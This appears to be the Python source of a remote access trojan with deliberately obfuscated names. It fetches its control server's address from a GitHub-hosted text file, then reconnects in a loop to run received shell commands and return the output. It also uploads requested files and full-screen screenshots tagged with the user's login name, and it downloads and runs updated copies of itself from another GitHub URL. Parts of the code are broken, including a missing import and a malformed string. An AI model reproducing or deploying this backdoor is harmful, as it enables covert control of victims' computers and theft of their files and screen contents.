import sys,subprocess,socket,time,requests
from PIL import ImageGrab
JTaKZTBr = "04.12.24.10"
DbYpxWmBT = ""
eHPLONTHjaqZJxbrUdWgj = ""
OMORGkAyeqGxBGW = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
xEfccuYNbzjtmqIILKVZz = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
kYweLVoOkXRpDyqvuUy = "!"
def BtnmTNSBgwxMkeVUgntR(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def VAVYmnMIrRFVhc(s):
	nqZYOOBfidHSmblVC = s.recv(1024)
	if len(nqZYOOBfidHSmblVC)==0:
		return True
	kxsLSFnmfjOexUfbogFM = nqZYOOBfidHSmblVC.decode("utf-8")
	if not kxsLSFnmfjOexUfbogFM.startswith(kYweLVoOkXRpDyqvuUy):
		proc = subprocess.run(kxsLSFnmfjOexUfbogFM, shell=True, capture_output=True)
		KWPtrgtOPVUk = proc.stdout + proc.stderr
		s.send(KWPtrgtOPVUk)
		return
	bHWBlzXgHDsUsEscHix = kxsLSFnmfjOexUfbogFM.split(" ")[0][1:]
	if bHWBlzXgHDsUsEscHix == "download":
		SBfTHFzozjWePvq(s, kxsLSFnmfjOexUfbogFM)
	elif bHWBlzXgHDsUsEscHix == "screenshot":
		aYuOuZEmUQlvBiXzNqNCRxP(s)
def SBfTHFzozjWePvq(s, kxsLSFnmfjOexUfbogFM):
	ULQpIqLSITSZUcQkIx = kxsLSFnmfjOexUfbogFM.replace(kYweLVoOkXRpDyqvuUy+"download ","").split(",")
	KWPtrgtOPVUks = []
	for f in ULQpIqLSITSZUcQkIx:
		KWPtrgtOPVUks += qpeRzAbLpUzViXYqQzBDyaf(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes("\n".join(KWPtrgtOPVUks), "utf-8"))
def aYuOuZEmUQlvBiXzNqNCRxP(kxsLSFnmfjOexUfbogFM):
	atdRzNVvHDGtBeZlNjoiWFi = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	atdRzNVvHDGtBeZlNjoiWFi.save(fpath)
	atdRzNVvHDGtBeZlNjoiWFi.close()
	r = qpeRzAbLpUzViXYqQzBDyaf(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def qpeRzAbLpUzViXYqQzBDyaf(wDIoFzkoPelfLrPCfHXlf, vytKZZPDqrMpC, hhGdbzfDMTP=None):
	if not os.path.exists(wDIoFzkoPelfLrPCfHXlf):
		return "[!] NOT FOUND: "+wDIoFzkoPelfLrPCfHXlf+"\n"
	headers = {"user":os.getlogin()}
	if hhGdbzfDMTP is not None:
		headers = {**headers, **hhGdbzfDMTP}
	requests.post(DbYpxWmBT+":"+eHPLONTHjaqZJxbrUdWgj+"/"+vytKZZPDqrMpC,
		files={open(wDIoFzkoPelfLrPCfHXlf, "rb")},
		headers=headers)
	return "[+] SUCCESS: "+wDIoFzkoPelfLrPCfHXlf+"\n"
def dvHnDOuU():
	if DbYpxWmBT == "" or eHPLONTHjaqZJxbrUdWgj == "":
		nqZYOOBfidHSmblVC = requests.get(OMORGkAyeqGxBGW).text.replace("\n","").split(":")
		DbYpxWmBT = nqZYOOBfidHSmblVC[0].strip()
		eHPLONTHjaqZJxbrUdWgj = nqZYOOBfidHSmblVC[1].strip()
		OcAIHZouoa = nqZYOOBfidHSmblVC[2].strip()
	return DbYpxWmBT, eHPLONTHjaqZJxbrUdWgj, OcAIHZouoa
def TdmKVOnve():
	NfDGcRhNzBhHBxYcrrd = os.path.basename(__file__)
	fileType = NfDGcRhNzBhHBxYcrrd.split(".")[-1]
	LdsVidTnelsUfWXe = NfDGcRhNzBhHBxYcrrd.replace(fileType,"") +"."+JTaKZTBr + fileType
	joXWXsnBYcmTnjfNsBUvabI = os.path.join(os.path.getcwd(), LdsVidTnelsUfWXe)
	with open(LdsVidTnelsUfWXe, "wb+") as f:
		f.write(requests.get(xEfccuYNbzjtmqIILKVZz+"/file"+joXWXsnBYcmTnjfNsBUvabI.split(".")[-1]))
	if fileType == ".exe":
		os.system(".\"+joXWXsnBYcmTnjfNsBUvabI)
	elif fileType == ".pyw":
		os.system("python "+joXWXsnBYcmTnjfNsBUvabI")
def KAdfjRiqzqEiPwFpgOsDL():
	pass
def cuqKWfyyjjsXUBuQ():
	h, p, v = dvHnDOuU()
	if JTaKZTBr != v:
		TdmKVOnve()
	KAdfjRiqzqEiPwFpgOsDL()
	hxHgUFsCdYIMYcLB = bytes("["+JTaKZTBr+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				HAKXzCSMVvW=False
				try:
					s=BtnmTNSBgwxMkeVUgntR(h, p)
					while not HAKXzCSMVvW:
						s.send(hxHgUFsCdYIMYcLB)
						HAKXzCSMVvW=VAVYmnMIrRFVhc(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(cuqKWfyyjjsXUBuQ())
